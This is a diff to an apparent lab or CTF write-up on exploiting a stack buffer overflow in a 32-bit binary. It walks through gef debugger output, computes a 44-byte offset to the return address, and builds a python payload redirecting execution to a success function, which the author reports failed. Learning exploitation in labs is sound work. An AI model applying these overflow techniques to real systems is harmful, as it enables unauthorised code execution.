@@ -59,9 +59,45 @@ run <<< $(python3 -c 'print ("\x41" * 50)')
 ─────────────────
 0x41414141 in ?? ()
 ```
-I get a `Segmentation Fault` in the `Instructions Pointer ($eip)`.`
-#### Debugger
-After you enter a password is gets entered into the `Stack Pointer`.
+I get a `Segmentation Fault` in the `Instructions Pointer ($eip)`.
+
+#### Find Pointer to Success Function
 ```
-$esp   : 0xffffd570  →  "AAAAAA"
+gef➤  print __s_func
+$38 = {<text variable, no debug info>} 0x8049182 <__s_func>
 ```
+Caution -> the function is missing a leading zero!
+
+#### Find Offset of Return Address
+I needed to overwrite the `Return Address` on the `Stack`.
+```
+gef➤  disas f
+gef➤  b *0x08049212		// this is a NOP instruction after scanf
+gef➤  find $esp,+96,0x0804922d	// x22d is address in main that being returned to
+0xffffd59c
+1 pattern found.
+
+gef➤  x/x 0xffffd59c
+0xffffd59c:	0x0804922d
+
+
+gef➤  x/24x $esp
+0xffffd570:	0x41414141	0x00000000	0x00000000	0x08049283
+0xffffd580:	0x00000001	0xffffd644	0xffffd64c	0x0804925b
+0xffffd590:	0xf7fe59b0	0x00000000	0xffffd5a8   -->0x0804922d<--
+0xffffd5a0:	0xf7fb8000	0xf7fb8000	0x00000000	0xf7df8e81
+0xffffd5b0:	0x00000001	0xffffd644	0xffffd64c	0xffffd5d4
+0xffffd5c0:	0x00000001	0x00000000	0xf7fb8000	0xf7fe575a
+
+gef➤  p/u 0xffffd59c - 0xffffd570
+$1 = 44
+```
+We have the offset.  We need to fill the Buffer with **44** characters and then write the address `0x8049182 <__s_func>` in `Little Endian` format.
+
+That should be: `"\x82\x91\x04\x08"`.
+
+#### Execute Payload
+```
+run <<< $(python3 -c 'print ("\x41" * 44) + "\x82\x91\x04\x08"')
+```
+This failed.  I got a `SegFault`. Something was being truncated.
